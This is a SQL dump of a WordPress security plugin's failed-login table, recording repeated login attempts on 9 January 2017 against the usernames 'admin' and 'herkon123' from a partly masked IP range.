INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("316","0","admin","2017-01-09 00:31:27","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("317","0","admin","2017-01-09 00:31:29","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("318","0","admin","2017-01-09 00:38:58","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("319","0","admin","2017-01-09 00:41:14","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("320","0","admin","2017-01-09 00:41:15","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("321","0","admin","2017-01-09 00:47:01","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("322","0","admin","2017-01-09 00:47:05","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("323","0","admin","2017-01-09 00:49:54","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("324","0","admin","2017-01-09 00:49:56","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("325","0","admin","2017-01-09 00:53:15","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("326","0","admin","2017-01-09 00:53:17","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("327","0","admin","2017-01-09 00:56:40","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("328","0","admin","2017-01-09 00:56:46","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("329","0","admin","2017-01-09 01:00:09","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("330","0","admin","2017-01-09 01:00:13","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("331","0","admin","2017-01-09 01:03:28","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("332","0","admin","2017-01-09 01:03:32","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("333","0","admin","2017-01-09 01:08:43","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("334","0","admin","2017-01-09 01:08:46","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("335","0","admin","2017-01-09 01:14:34","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("336","0","admin","2017-01-09 01:14:37","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("337","0","admin","2017-01-09 01:20:32","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("338","0","admin","2017-01-09 01:20:37","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("339","0","admin","2017-01-09 01:26:46","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("340","0","admin","2017-01-09 01:26:48","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("341","0","admin","2017-01-09 01:32:56","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("342","0","admin","2017-01-09 01:32:57","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("343","0","admin","2017-01-09 01:38:55","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("344","0","admin","2017-01-09 01:38:56","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("345","0","admin","2017-01-09 01:45:00","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("346","0","admin","2017-01-09 01:45:05","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("347","0","admin","2017-01-09 01:50:51","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("348","0","admin","2017-01-09 01:50:56","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("349","0","admin","2017-01-09 01:56:35","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("350","0","admin","2017-01-09 01:56:37","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("351","0","admin","2017-01-09 02:02:16","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("352","0","admin","2017-01-09 02:02:18","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("353","0","admin","2017-01-09 02:07:54","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("354","0","admin","2017-01-09 02:07:56","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("355","0","admin","2017-01-09 02:13:31","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("356","0","admin","2017-01-09 02:13:32","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("357","0","admin","2017-01-09 02:19:56","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("358","0","admin","2017-01-09 02:19:58","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("359","0","admin","2017-01-09 02:27:30","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("360","0","admin","2017-01-09 02:27:33","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("361","0","admin","2017-01-09 02:35:24","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("362","0","admin","2017-01-09 02:35:25","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("363","0","admin","2017-01-09 02:42:45","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("364","0","admin","2017-01-09 02:42:49","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("365","0","admin","2017-01-09 02:50:32","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("366","0","admin","2017-01-09 02:50:34","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("367","0","admin","2017-01-09 02:58:06","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("368","0","admin","2017-01-09 02:58:08","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("369","0","admin","2017-01-09 03:05:42","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("370","0","admin","2017-01-09 03:05:44","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("371","0","admin","2017-01-09 03:13:18","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("372","0","admin","2017-01-09 03:13:19","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("373","0","admin","2017-01-09 03:20:57","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("374","0","admin","2017-01-09 03:20:59","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("375","0","admin","2017-01-09 03:28:41","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("376","0","admin","2017-01-09 03:28:45","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("377","0","admin","2017-01-09 03:36:27","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("378","0","admin","2017-01-09 03:36:29","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("379","0","admin","2017-01-09 03:43:01","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("380","0","admin","2017-01-09 03:43:03","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("381","0","admin","2017-01-09 03:49:13","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("382","0","admin","2017-01-09 03:49:14","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("383","0","admin","2017-01-09 03:55:21","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("384","0","admin","2017-01-09 03:55:22","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("385","0","admin","2017-01-09 04:01:16","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("386","0","admin","2017-01-09 04:01:17","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("387","0","admin","2017-01-09 04:06:54","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("388","0","admin","2017-01-09 04:06:55","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("389","0","admin","2017-01-09 04:12:18","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("390","0","admin","2017-01-09 04:12:20","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("391","0","admin","2017-01-09 04:17:33","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("392","0","admin","2017-01-09 04:17:34","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("393","0","admin","2017-01-09 04:22:49","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("394","0","admin","2017-01-09 04:22:50","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("395","0","admin","2017-01-09 04:28:00","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("396","0","admin","2017-01-09 04:28:02","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("397","0","admin","2017-01-09 04:33:25","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("398","0","admin","2017-01-09 04:33:27","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("399","0","admin","2017-01-09 04:38:24","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("400","0","admin","2017-01-09 04:38:26","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("401","0","admin","2017-01-09 04:43:31","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("402","0","admin","2017-01-09 04:43:33","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("403","0","admin","2017-01-09 04:48:40","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("404","0","admin","2017-01-09 04:48:41","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("405","0","admin","2017-01-09 04:53:51","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("406","0","admin","2017-01-09 04:53:52","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("407","0","admin","2017-01-09 04:58:59","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("408","0","admin","2017-01-09 04:59:00","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("409","0","admin","2017-01-09 05:04:15","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("410","0","admin","2017-01-09 05:04:16","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("411","0","admin","2017-01-09 05:09:24","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("412","0","admin","2017-01-09 05:09:26","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("413","0","admin","2017-01-09 05:14:43","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("414","0","admin","2017-01-09 05:14:44","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("415","0","admin","2017-01-09 05:19:53","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("416","0","admin","2017-01-09 05:19:55","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("417","0","admin","2017-01-09 05:25:10","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("418","0","admin","2017-01-09 05:25:11","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("419","0","admin","2017-01-09 05:30:29","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("420","0","admin","2017-01-09 05:30:30","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("421","0","admin","2017-01-09 05:36:12","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("422","0","admin","2017-01-09 05:36:15","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("423","0","admin","2017-01-09 05:41:55","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("424","0","admin","2017-01-09 05:41:57","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("425","0","admin","2017-01-09 05:47:41","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("426","0","admin","2017-01-09 05:47:43","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("427","0","admin","2017-01-09 05:53:16","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("428","0","admin","2017-01-09 05:53:18","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("429","0","admin","2017-01-09 05:58:41","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("430","0","admin","2017-01-09 05:58:44","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("431","0","admin","2017-01-09 06:04:01","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("432","0","admin","2017-01-09 06:04:03","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("433","0","admin","2017-01-09 06:09:05","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("434","0","admin","2017-01-09 06:09:08","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("435","0","admin","2017-01-09 06:14:19","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("436","0","admin","2017-01-09 06:14:21","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("437","0","admin","2017-01-09 06:19:34","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("438","0","admin","2017-01-09 06:19:37","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("439","0","admin","2017-01-09 06:24:47","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("440","0","admin","2017-01-09 06:24:50","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("441","0","admin","2017-01-09 06:29:51","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("442","0","admin","2017-01-09 06:29:54","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("443","0","admin","2017-01-09 06:35:27","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("444","0","admin","2017-01-09 06:35:29","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("445","0","admin","2017-01-09 06:40:28","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("446","0","admin","2017-01-09 06:40:30","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("447","0","admin","2017-01-09 06:45:39","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("448","0","admin","2017-01-09 06:45:41","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("449","0","admin","2017-01-09 06:50:47","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("450","0","admin","2017-01-09 06:50:51","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("451","0","admin","2017-01-09 06:55:59","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("452","0","admin","2017-01-09 06:56:01","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("453","0","admin","2017-01-09 07:01:17","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("454","0","admin","2017-01-09 07:01:19","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("455","0","admin","2017-01-09 07:06:38","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("456","0","admin","2017-01-09 07:06:40","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("457","0","admin","2017-01-09 07:11:46","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("458","0","admin","2017-01-09 07:11:48","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("459","0","admin","2017-01-09 07:16:54","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("460","0","admin","2017-01-09 07:16:57","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("461","0","admin","2017-01-09 07:22:14","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("462","0","admin","2017-01-09 07:22:17","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("463","0","admin","2017-01-09 07:27:22","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("464","0","admin","2017-01-09 07:27:24","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("465","0","admin","2017-01-09 07:32:48","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("466","0","admin","2017-01-09 07:32:50","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("467","0","admin","2017-01-09 07:37:46","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("468","0","admin","2017-01-09 07:37:50","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("469","0","admin","2017-01-09 07:42:59","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("470","0","admin","2017-01-09 07:43:04","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("471","0","admin","2017-01-09 07:48:04","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("472","0","admin","2017-01-09 07:48:07","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("473","0","admin","2017-01-09 07:53:19","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("474","0","admin","2017-01-09 07:53:21","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("475","0","admin","2017-01-09 07:58:29","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("476","0","admin","2017-01-09 07:58:31","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("477","0","admin","2017-01-09 08:03:41","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("478","0","admin","2017-01-09 08:03:42","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("479","0","admin","2017-01-09 08:08:48","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("480","0","admin","2017-01-09 08:08:50","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("481","0","admin","2017-01-09 08:14:03","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("482","0","admin","2017-01-09 08:14:06","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("483","0","admin","2017-01-09 08:19:18","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("484","0","admin","2017-01-09 08:19:21","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("485","0","admin","2017-01-09 08:24:38","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("486","0","admin","2017-01-09 08:24:40","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("487","0","admin","2017-01-09 08:29:53","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("488","0","admin","2017-01-09 08:29:58","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("489","0","admin","2017-01-09 08:35:14","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("490","0","admin","2017-01-09 08:35:16","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("491","0","admin","2017-01-09 08:40:23","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("492","0","admin","2017-01-09 08:40:25","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("493","0","admin","2017-01-09 08:45:34","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("494","0","admin","2017-01-09 08:45:37","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("495","0","admin","2017-01-09 08:50:41","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("496","0","admin","2017-01-09 08:50:42","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("497","0","admin","2017-01-09 08:55:57","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("498","0","admin","2017-01-09 08:55:59","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("499","0","admin","2017-01-09 09:01:18","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("500","0","admin","2017-01-09 09:01:20","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("501","0","admin","2017-01-09 09:06:32","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("502","0","admin","2017-01-09 09:06:36","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("503","0","admin","2017-01-09 09:11:54","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("504","0","admin","2017-01-09 09:11:56","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("505","0","admin","2017-01-09 09:17:12","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("506","0","admin","2017-01-09 09:17:16","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("507","0","admin","2017-01-09 09:22:33","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("508","0","admin","2017-01-09 09:22:35","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("509","0","admin","2017-01-09 09:27:53","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("510","0","admin","2017-01-09 09:27:55","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("511","0","admin","2017-01-09 09:33:18","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("512","0","admin","2017-01-09 09:33:20","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("513","0","admin","2017-01-09 09:38:40","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("514","0","admin","2017-01-09 09:38:42","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("515","0","admin","2017-01-09 09:44:06","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("516","0","admin","2017-01-09 09:44:09","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("517","0","admin","2017-01-09 09:49:27","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("518","0","admin","2017-01-09 09:49:30","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("519","0","admin","2017-01-09 09:54:49","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("520","0","admin","2017-01-09 09:54:51","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("521","0","admin","2017-01-09 10:00:06","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("522","0","admin","2017-01-09 10:00:09","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("523","0","admin","2017-01-09 10:05:30","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("524","0","admin","2017-01-09 10:05:31","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("525","0","admin","2017-01-09 10:10:51","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("526","0","admin","2017-01-09 10:10:52","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("527","0","admin","2017-01-09 10:16:19","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("528","0","admin","2017-01-09 10:16:21","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("529","0","admin","2017-01-09 10:21:41","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("530","0","admin","2017-01-09 10:21:42","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("531","0","admin","2017-01-09 10:27:30","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("532","0","admin","2017-01-09 10:27:31","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("533","0","admin","2017-01-09 10:33:21","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("534","0","admin","2017-01-09 10:33:22","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("535","0","admin","2017-01-09 10:38:59","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("536","0","admin","2017-01-09 10:39:00","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("537","0","admin","2017-01-09 10:44:41","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("538","0","admin","2017-01-09 10:44:42","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("539","0","admin","2017-01-09 10:50:19","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("540","0","admin","2017-01-09 10:50:20","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("541","0","admin","2017-01-09 10:56:03","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("542","0","admin","2017-01-09 10:56:04","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("543","0","admin","2017-01-09 11:01:46","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("544","0","admin","2017-01-09 11:01:47","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("545","0","admin","2017-01-09 11:07:21","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("546","0","admin","2017-01-09 11:07:22","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("547","0","admin","2017-01-09 11:12:35","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("548","0","admin","2017-01-09 11:12:36","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("549","0","admin","2017-01-09 11:17:51","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("550","0","admin","2017-01-09 11:17:52","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("551","0","admin","2017-01-09 11:23:06","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("552","0","admin","2017-01-09 11:23:07","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("553","0","admin","2017-01-09 11:28:25","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("554","0","admin","2017-01-09 11:28:26","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("555","0","admin","2017-01-09 11:33:48","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("556","0","admin","2017-01-09 11:33:49","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("557","1","herkon123","2017-01-09 11:39:40","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("558","1","herkon123","2017-01-09 11:39:41","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("559","1","herkon123","2017-01-09 11:53:38","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("560","1","herkon123","2017-01-09 11:53:39","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("561","1","herkon123","2017-01-09 12:08:44","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("562","1","herkon123","2017-01-09 12:08:45","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("563","1","herkon123","2017-01-09 12:23:30","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("564","1","herkon123","2017-01-09 12:23:32","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("565","1","herkon123","2017-01-09 12:38:23","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("566","1","herkon123","2017-01-09 12:38:25","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("567","1","herkon123","2017-01-09 12:53:30","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("568","1","herkon123","2017-01-09 12:53:31","91.210.147.*");
